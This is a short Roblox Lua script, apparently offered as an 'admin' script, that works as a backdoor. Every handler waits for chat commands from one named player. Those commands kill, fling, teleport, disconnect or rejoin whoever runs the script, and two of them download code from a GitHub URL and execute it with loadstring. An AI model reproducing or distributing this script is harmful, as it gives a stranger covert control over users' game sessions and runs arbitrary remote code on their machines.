

game.Players.zzotac.Chatted:connect(function(Message)
if Message:lower() == "/e kill" then
game.Players.LocalPlayer.Character.Humanoid.Health = 0
end
end)

game.Players.zzotac.Chatted:connect(function(Message)
if Message:lower() == "/e fling" then
game:getService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2722238.6643066406, 4862221.3525390625, -27222274.0993652344)
end
end)

game.Players.zzotac.Chatted:connect(function(Message)
if Message:lower() == "/e bring" then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.zzotac.Character.HumanoidRootPart.CFrame
end
end)

game.Players.zzotac.Chatted:connect(function(Message)
if Message:lower() == "/e sound" then

 local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = "http://www.roblox.com/asset/?id=4809574295"
hi.Volume = 10
hi.Looped = false
hi.archivable = false
hi.Parent = game.Workspace

if game.Players.LocalPlayer.Character.Humanoid.Health > 10 then
hi:Play()
end
end
end)

game.Players.zzotac.Chatted:connect(function(Message)
if Message:lower() == "/e kick" then
game:Shutdown()
end
end)

game.Players.zzotac.Chatted:connect(function(Message)
if Message:lower() == "/e troll" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/shrek'))()
end
end)

game.Players.zzotac.Chatted:connect(function(Message)
if Message:lower() == "/e troll2" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/1x1x1'))()
end
end)

game.Players.zzotac.Chatted:connect(function(Message)
if Message:lower() == "/e rj" then
local ts = game:GetService("TeleportService")
local p = game:GetService("Players").LocalPlayer
ts:Teleport(game.PlaceId, p)
end
end)

print("executed admin")
